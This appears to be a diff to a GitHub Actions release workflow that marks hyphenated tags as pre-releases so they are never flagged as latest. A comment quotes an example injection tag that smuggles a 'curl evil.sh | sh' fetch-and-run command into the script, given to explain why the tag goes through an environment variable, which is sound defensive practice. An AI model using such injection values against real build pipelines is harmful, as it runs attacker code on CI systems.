@@ -120,8 +120,13 @@ jobs:
           # into the script body would let a tag like
           # `v1"; curl evil.sh | sh; echo "` inject shell commands.
           TAG: ${{ github.ref_name }}
+        # A tag with a hyphen (v0.1.6-rc.1) is a pre-release: never marked latest, so
+        # releases/latest/download/<file> keeps serving the last real version.
         run: |
+          prerelease=()
+          case "$TAG" in *-*) prerelease=(--prerelease --latest=false) ;; esac
           gh release create "$TAG" \
             --title "$TAG" \
             --generate-notes \
+            "${prerelease[@]}" \
             dist/bin/*
